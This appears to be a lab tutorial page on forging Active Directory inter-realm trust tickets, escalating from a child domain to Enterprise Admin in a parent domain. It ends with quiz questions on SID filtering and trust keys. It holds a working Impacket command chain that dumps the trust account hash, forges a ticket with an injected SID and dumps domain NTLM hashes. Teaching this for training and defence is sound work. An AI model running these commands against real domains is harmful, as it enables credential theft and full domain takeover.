#Forging Trust Tickets

Earlier, we've performed the Trustpocalypse attack, which forges a TGT with an injected SID: The EAs SID.
This TGT is then sent to the CAPTAIN, CAPTAIN will create a Trust Ticket, or an Inter-Realm Ticket, and forward this ticket to the CHIEF DC. This Trust Ticket is encrypted using the trust key, rather than with the krbtgt's key.

In this attack, we'll cut to the chase and forge the trust ticket itself using the trust key. Instead of forging a TGT and letting the trusted DC (CAPTAIN) generate the inter-realm ticket, we now forge the inter-realm ticket ourselves using the trust key (ALTAIR$). This allows direct access to services in the trusting domain (ALTAIR) without relying on CAPTAIN. We'll follow the same steps as in the Trustpocalypse attack. This attack helps further understanding how cross domain authentication is processed from an attacker's point of view. The end result of this attack is the same as the Trustpocalypse attack.

```
#retrieve the ALTAIR$ password hash, the trust account present in CAPTAIN
#remember to use your own hashes from your environment, they might be different
secretsdump.py north.altair.local/administrator@192.168.122.10 -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86
#[+] ALTAIR$:1103:aad3b435b51404eeaad3b435b51404ee:5c637c666075bc3fe4ba6d5688536cc1:::
#forge a referral ticket
ticketer.py -nthash 5c637c666075bc3fe4ba6d5688536cc1 -domain-sid S-1-5-21-1162943719-2261011477-1519509434 -domain north.altair.local -extra-sid S-1-5-21-1073456172-1737515156-949376640-519 -spn krbtgt/altair.local berntheman
export KRB5CCNAME=/home/ubuntu/berntheman.ccache
#use the interrealm ticket to get a service ticket to the cifs/smb service with EA privileges
getST.py -k -no-pass -spn cifs/chief.altair.local altair.local/berntheman@altair.local -debug
#compromise the altair domain
export KRB5CCNAME=/home/ubuntu/berntheman@altair.local@cifs_chief.altair.local@ALTAIR.LOCAL.ccache
secretsdump.py -k -no-pass -just-dc-ntlm berntheman@chief.altair.local
```

Done! This is a different way of forging a ticket that compromises trusting domains!

!!! question
    What's the difference between this and the Trustpocalypse attack?
??? success "Answer"
    In Trustpocalypse, the attacker forges a TGT and lets the trusted DC create the trust ticket.
    In this attack, the attacker forges the trust ticket directly using the trust key, bypassing the trusted DC.

!!! question
    Would SID Filtering mitigate this attack?
??? success "Answer"
    Yes, SIDs from different domains would still be filtered when authenticating to the altair domain, which would render this attack useless.

!!! question
    What role does the trust key have play in cross-domain authentication?
??? success "Answer"
    The trust key is used to encrypt and sign trust tickets issued by the trusted domain, proving their validity to the trusting domain. Through the use of a trust key, the trusting domain can determine if the ticket is actually sent from a trusted domain, since trust keys are agreed between trusted and trusting domains upon trust relationship establishment.